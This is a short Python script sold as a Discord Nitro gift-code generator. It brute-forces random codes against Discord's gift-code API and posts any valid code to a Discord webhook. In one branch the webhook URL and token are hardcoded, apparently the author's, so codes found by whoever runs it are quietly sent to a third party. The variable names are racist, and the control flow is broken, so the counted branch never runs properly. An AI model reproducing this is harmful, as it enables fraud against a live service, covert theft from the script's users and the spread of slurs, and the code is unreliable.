import random
import string
import requests
from dhooks import Webhook
blackmen = input("Enter amount of nitros (inf for inf gens): ")
if blackmen == "inf":
    while True:
        letters = string.ascii_letters
        gamer = ''.join(random.choice(letters) for i in range(16)) 
        gamer1 = "https://discord.gift/"+gamer
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{gamer}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Working Nitro Code: {gamer1}")
            hook = Webhook("https://discord.com/api/webhooks/906655648689831966/P4X2DwpIe0hWcYobBCJBOjBF9zM61ZAJKA9_rGojTAxM8XsiAUVYZuB9FoCFYu2W7sN8")
            hook.send(gamer)
        else:
            print(f"Invalid Nitro Code: {gamer1}")
    else:
        blackmen = int(blackmen)
        whitemen = 0
        while whitemen <= blackmen:
            letters = string.ascii_letters
            gamer = ''.join(random.choice(letters) for i in range(16)) 
            gamer1 = "https://discord.gift/"+gamer
            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{gamer}?with_application=false&with_subscription_plan=true"
            response = requests.get(url)
            if response.status_code == 200:
                print(f"Working Nitro Code: {gamer1}")
                hook = Webhook("insert hook here")
                hook.send("@everyone VALID NITRO CODE " + gamer)
            else:
                print(f"Invalid Nitro Code: {gamer1}")
            whitemen = whitemen + 1
